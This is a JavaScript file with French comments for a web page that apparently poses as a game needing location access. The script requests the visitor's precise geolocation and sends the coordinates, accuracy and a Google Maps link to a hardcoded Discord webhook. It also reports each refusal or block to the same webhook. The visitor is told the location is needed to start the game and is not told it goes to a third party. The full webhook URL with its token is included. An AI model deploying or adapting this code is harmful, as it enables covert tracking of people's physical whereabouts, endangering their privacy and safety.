const discordWebhook = "https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb";

document.getElementById("locBtn").addEventListener("click", () => {

    navigator.permissions.query({ name: "geolocation" }).then(status => {

        if (status.state === "denied") {
            // 🚫 L’UTILISATEUR A BLOQUÉ DÉFINITIVEMENT
            fetch(discordWebhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Website Logger (location)",
                    embeds: [
                        {
                            title: "❌ Localisation bloquée définitivement",
                            description:
                                "**L’utilisateur a activé :** Bloquer / Ne plus demander\n\n" +
                                "📌 **Aucune popup ne peut être affichée automatiquement.**\n" +
                                "⛔ *Statut navigateur :* `" + status.state + "`",
                            color: 0xff0000
                        }
                    ]
                })
            });

            alert("La localisation est bloquée. Active-la dans les paramètres du site.");
            return;
        }

        // Sinon → on demande normalement
        navigator.geolocation.getCurrentPosition(

            // 👍 LOCALISATION AUTORISÉE
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                fetch(discordWebhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Website Logger (exact location)",
                        embeds: [
                            {
                                title: "📍 Localisation autorisée",
                                description:
`**Latitude :** ${lat}
**Longitude :** ${lon}
**Précision :** ${acc} m

🔗 Google Maps :
https://www.google.com/maps?q=${lat},${lon}`,
                                color: 0x00aaff
                            }
                        ]
                    })
                });

                window.location.href = "#"; // Ta page après autorisation
            },

            // ❌ LOCALISATION REFUSÉE (mais pas bloquée)
            (err) => {
                fetch(discordWebhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Website Logger (location)",
                        embeds: [
                            {
                                title: "⚠️ Localisation refusée",
                                description:
                                    "**L’utilisateur a cliqué sur Refuser.**\n" +
                                    "Ce n’est pas un blocage définitif.",
                                color: 0xff9900
                            }
                        ]
                    })
                });

                document.getElementById("error").style.display = "block";
                document.getElementById("error").innerHTML =
                    "⚠️ Vous avez refusé la géolocalisation.<br><br>" +
                    "Veuillez autoriser la localisation pour commencer le jeu.";
            },

            { enableHighAccuracy: true, timeout: 10000 }

        );
    });
});


